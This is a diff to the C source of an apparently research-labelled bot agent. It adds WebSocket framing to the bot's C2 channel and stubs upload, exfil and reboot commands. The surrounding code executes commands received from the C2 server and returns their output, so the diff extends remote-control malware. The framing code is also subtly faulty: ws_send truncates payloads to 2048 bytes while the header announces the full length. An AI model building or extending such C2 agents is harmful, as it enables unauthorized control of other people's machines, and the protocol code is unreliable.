@@ -579,34 +579,151 @@ int ws_connect(notnet_bot_t *bot) {
     return 0;
 }
 
+/* ── WebSocket Protocol Helpers ───────────────────────────────── */
+/* SECURITY FIX (#22): Implement proper RFC 6455 WebSocket framing.
+ * Previously ws_send/ws_read sent/received raw data without frame headers. */
+
+/* Generate a random 4-byte masking key for client-to-server frames */
+static void ws_make_mask(uint8_t *mask) {
+    mask[0] = rand() & 0xFF;
+    mask[1] = rand() & 0xFF;
+    mask[2] = rand() & 0xFF;
+    mask[3] = rand() & 0xFF;
+}
+
+/* Apply WebSocket mask to payload data in-place */
+static void ws_apply_mask(uint8_t *data, size_t len, const uint8_t *mask) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= mask[i % 4];
+    }
+}
+
 int ws_send(notnet_bot_t *bot, const char *data, int len) {
     if (!bot->c2_ws.connected) return -1;
-    /* Simple WebSocket framing - send raw data for now */
-    return send(bot->c2_ws.sock, data, len, 0);
+
+    /* Build RFC 6455 frame:
+     * Byte 0: FIN(1) + RSV(0) + Opcode(1=text)
+     * Byte 1: MASK(1, client must mask) + Payload len(7)
+     * Then: 4-byte mask key
+     * Then: masked payload */
+    uint8_t header[14];  /* max header size for 64-bit payload length */
+    int hdr_len = 0;
+
+    /* FIN bit set + opcode 1 (text frame) */
+    header[hdr_len++] = 0x81;
+
+    /* Masking bit set (client-to-server) */
+    uint8_t mask[4];
+    ws_make_mask(mask);
+
+    if (len < 126) {
+        header[hdr_len++] = 0x80 | (uint8_t)len;
+    } else if (len < 65536) {
+        header[hdr_len++] = 0x80 | 126;
+        header[hdr_len++] = (len >> 8) & 0xFF;
+        header[hdr_len++] = len & 0xFF;
+    } else {
+        header[hdr_len++] = 0x80 | 127;
+        for (int i = 7; i >= 0; i--) {
+            header[hdr_len++] = (len >> (i * 8)) & 0xFF;
+        }
+    }
+
+    /* Append mask key */
+    memcpy(header + hdr_len, mask, 4);
+    hdr_len += 4;
+
+    /* Copy data to a temp buffer for masking */
+    char masked[2048];
+    int send_len = len;
+    if (send_len > (int)sizeof(masked)) send_len = sizeof(masked);
+    memcpy(masked, data, send_len);
+    ws_apply_mask((uint8_t *)masked, send_len, mask);
+
+    /* Send header + masked payload */
+    send(bot->c2_ws.sock, header, hdr_len, 0);
+    return send(bot->c2_ws.sock, masked, send_len, 0);
 }
 
 int ws_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_ws.connected) return -1;
-    
+
     fd_set fds;
     struct timeval tv;
     FD_ZERO(&fds);
     FD_SET(bot->c2_ws.sock, &fds);
     tv.tv_sec = 0;
     tv.tv_usec = 0;
-    
+
     if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
-    
-    int received = recv(bot->c2_ws.sock, buf, len, 0);
-    if (received <= 0) {
+
+    /* Read frame header (2 bytes minimum) */
+    uint8_t frame_hdr[2];
+    int r = recv(bot->c2_ws.sock, frame_hdr, 2, 0);
+    if (r <= 0) {
         bot->c2_ws.connected = 0;
-        close(bot->c2_ws.sock);
+        if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
         bot->c2_ws.sock = -1;
         return -1;
     }
-    
-    buf[received] = '\0';
-    return received;
+
+    int fin = (frame_hdr[0] & 0x80) >> 7;
+    int opcode = frame_hdr[0] & 0x0F;
+    int masked = (frame_hdr[1] & 0x80) >> 7;
+    uint8_t payload_len = frame_hdr[1] & 0x7F;
+
+    /* Determine actual payload length */
+    int plen = payload_len;
+    if (plen == 126) {
+        uint8_t ext[2];
+        recv(bot->c2_ws.sock, (char *)ext, 2, 0);
+        plen = (ext[0] << 8) | ext[1];
+    } else if (plen == 127) {
+        uint8_t ext[8];
+        recv(bot->c2_ws.sock, (char *)ext, 8, 0);
+        plen = 0;
+        for (int i = 0; i < 8; i++) {
+            plen = (plen << 8) | ext[i];
+        }
+    }
+
+    /* Read mask key if present (server-to-client frames are unmasked,
+     * but we handle both cases) */
+    uint8_t mask[4] = {0};
+    if (masked) {
+        recv(bot->c2_ws.sock, (char *)mask, 4, 0);
+    }
+
+    /* Read payload */
+    if (plen > len - 1) plen = len - 1;
+    int total = 0;
+    while (total < plen) {
+        int n = recv(bot->c2_ws.sock, buf + total, plen - total, 0);
+        if (n <= 0) break;
+        total += n;
+    }
+
+    if (total <= 0) return -1;
+
+    /* Unmask if needed */
+    if (masked) {
+        for (int i = 0; i < total; i++) {
+            buf[i] ^= mask[i % 4];
+        }
+    }
+
+    /* Handle control frames (close, ping, pong) by returning 0 */
+    if (opcode == 0x8 || opcode == 0x9 || opcode == 0xA) {
+        if (opcode == 0x8) {
+            /* Close frame - send close frame back and disconnect */
+            uint8_t close_frame[] = { 0x88, 0x00 };
+            send(bot->c2_ws.sock, (char *)close_frame, 2, 0);
+        }
+        return 0;
+    }
+
+    buf[total] = '\0';
+    return total;
 }
 
 void ws_disconnect(notnet_bot_t *bot) {
@@ -871,10 +988,22 @@ int protocol_process_commands(notnet_bot_t *bot) {
             protocol_send_response(bot, CMD_EXEC, output);
         } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
             log_info("CMD: download");
+        } else if (strncmp(cmd, CMD_UPLOAD, strlen(CMD_UPLOAD)) == 0) {
+            /* SECURITY: Log upload commands for audit trail. Actual file
+             * upload is not implemented — operator must use external tooling. */
+            log_warn("CMD: upload requested but not implemented");
+            protocol_send_response(bot, CMD_UPLOAD, "upload: not implemented on agent");
+        } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
+            /* SECURITY: Log exfil attempts. Data exfiltration is not
+             * implemented — operator must use external tooling. */
+            log_warn("CMD: exfil requested but not implemented");
+            protocol_send_response(bot, CMD_EXFIL, "exfil: not implemented on agent");
         } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
             log_info("CMD: update");
         } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
-            log_info("CMD: reboot");
+            log_warn("CMD: reboot requested by C2");
+            protocol_send_response(bot, CMD_REBOOT, "reboot: received");
+            /* Do not actually reboot — this is a research tool */
         } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
             char *interval = strchr(cmd, ' ');
             if (interval) {
